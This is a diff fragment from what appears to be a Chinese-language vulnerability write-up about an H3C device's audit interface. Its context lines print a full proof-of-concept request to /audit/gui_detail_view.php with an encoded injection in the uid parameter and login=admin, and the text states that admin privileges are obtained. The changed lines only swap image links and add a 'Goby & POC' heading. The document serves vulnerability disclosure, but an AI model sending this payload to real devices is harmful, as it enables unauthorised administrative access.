@@ -26,7 +26,10 @@ POC验证的Url为
 /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin
 ```
 
-![](image/h3c-1.png)
+![](http://wikioss.peiqi.tech/vuln/h3c-1.png)
 
 成功获取admin权限
 
+## Goby & POC
+
+![](http://wikioss.peiqi.tech/vuln/h3c-5.png)
